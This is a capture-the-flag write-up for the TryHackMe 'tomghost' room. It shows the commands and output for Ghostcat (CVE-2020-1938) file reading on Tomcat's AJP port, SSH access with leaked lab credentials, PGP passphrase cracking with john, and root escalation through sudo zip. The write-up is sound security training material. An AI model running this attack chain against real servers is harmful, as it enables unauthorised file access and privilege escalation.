# [tomghost - Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.](https://tryhackme.com/r/room/tomghost)

![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/016dea7c96e8b422241016405b571c8b.jpeg)


## Enumeration

### Nmap

```
kali@kali:~/CTFs$ nmap -sC -sV -Pn $TARGETIP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 11:42 EDT
Nmap scan report for <TARGETIP>
Host is up (0.038s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.20 seconds
```

- Apache Tomcat and Apache Jserv are accessible

**Apache Jserv** is a packet-oriented, binary protocol, which can proxy inbound requests from a web server through to an application server. In other words, it allows the communication between a standalone web server and Tomcat. It should not be exposed to the public, since it can be used to gather sensitive information.

## Exploiting Apache Jserv

[CVE-2020-1938 - 'Ghostcat'](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)

The CVE is about a file read/inclusion vulnerability in the AJP connector in Apache Tomcat. Given the default config, the vulnerability is enabled by default on the default port 8009. An attacker can use this to remotely read web application files without having to authorize and
retrieve files anywhere in the web application, as long as the location is reachable via `ServletContext.getResourceAsStream()`, including directories such as **WEB-INF** and **META-INF**, which may provide sensitive data like login information.

To exploit our target, there is a script provided within the `metasploit`-framework. By reading */WEB-INF/web.xml*, we get the following result:
```
[*] Running module against <TARGETIP>
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```
- skyfuck:8730281lkjlkjdqlksalks seem to be credentials -> we can use them to establish an SSH-connection (`ssh skyfuck@<TARGETIP>`)

### Investigating skyf*ck's home-directory
Essentially, there are two important files
- tryhackme.asc - .asc files are used for secure communication -> it most likely includes the private key to decrypt the credential.pgp file
- credential.pgp - an encrypted file

1. Getting files over
```
scp skyfuck@<TARGETIP>:tryhackme.asc .
```
```
scp skyfuck@<TARGETIP>:credential.pgp .
```

2. Cracking tryhackme.asc using `john`
```
kali@kali:~/CTFs/tomghost/files_from_sky$ gpg2john tryhackme.asc > tryhackme.hash

File tryhackme.asc
                                                                                                                      
kali@kali:~/CTFs/tomghost/files_from_sky$ john -wordlist:/usr/share/wordlists/rockyou.txt tryhackme.hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2024-05-22 13:14) 11.11g/s 11933p/s 11933c/s 11933C/s theresa..trisha
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                      
kali@kali:~/CTFs/tomghost/files_from_sky$ 
```
3. Decrypt credential.pgp with **alexandru** as secretkey 
```
kali@kali:~/CTFs/tomghost/files_from_sky$ gpg --import tryhackme.asc             
```
```
kali@kali:~/CTFs/tomghost/files_from_sky$ gpg credential.pgp        
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
                                                                                                                      
kali@kali:~/CTFs/tomghost/files_from_sky$ ls
credential  credential.pgp  tryhackme.asc  tryhackme.hash
                                                                                                                      
kali@kali:~/CTFs/tomghost/files_from_sky$ cat credential     
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j   
```

## User-flag
We can now establish an SSH-connection as the user **merlin** and gather the user-flag.
```
merlin@ubuntu:~$ cat user.txt
XXX{XXXXXXXXXXXXXXXXXXXX}
merlin@ubuntu:~$ 
```

## Root-flag
```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
merlin@ubuntu:~$ 
```
- /usr/bin/zip can be executed as root without a password via `sudo -> privilege escalation
- [GTFOBins](https://gtfobins.github.io/gtfobins/zip/)

```
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# 
rm: missing operand
Try 'rm --help' for more information.
# cat /root/root.txt
XXX{XXXXXXXXXXX}
# 
```
